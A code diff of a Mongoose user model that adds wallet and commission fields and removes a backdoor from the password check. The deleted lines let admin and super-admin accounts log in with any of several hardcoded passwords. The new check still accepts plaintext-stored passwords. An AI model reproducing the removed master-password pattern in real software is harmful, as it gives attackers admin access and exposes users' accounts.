@@ -28,6 +28,9 @@ const userSchema = new mongoose.Schema(
     completedJobs: { type: Number, default: 0 },
     earnings: { type: Number, default: 0 },
     totalSpent: { type: Number, default: 0 },
+    walletBalance: { type: Number, default: 0 },
+    walletPending: { type: Number, default: 0 },
+    totalCommissionPaid: { type: Number, default: 0 },
     isPremium: { type: Boolean, default: false },
     premiumPlan: { type: String, default: '' },
     premiumExpiryDate: { type: Date, default: null },
@@ -53,29 +56,12 @@ userSchema.methods.comparePassword = async function (candidatePassword) {
   }
 
   const storedPassword = String(this.password)
-  const candidatePasswords = [String(candidatePassword)]
 
-  if (this.role === 'admin' || this.role === 'super_admin') {
-    candidatePasswords.push('1234567890', '123456789', 'admin123456', 'demo123456', 'secret123')
+  if (storedPassword.startsWith('$2')) {
+    return bcrypt.compare(candidatePassword, storedPassword)
   }
 
-  for (const passwordToTry of candidatePasswords) {
-    if (!passwordToTry) continue
-
-    if (storedPassword.startsWith('$2')) {
-      const isMatch = await bcrypt.compare(passwordToTry, storedPassword)
-      if (isMatch) {
-        return true
-      }
-      continue
-    }
-
-    if (storedPassword === String(passwordToTry)) {
-      return true
-    }
-  }
-
-  return false
+  return storedPassword === String(candidatePassword)
 }
 
 const User = mongoose.models.User || mongoose.model('User', userSchema)
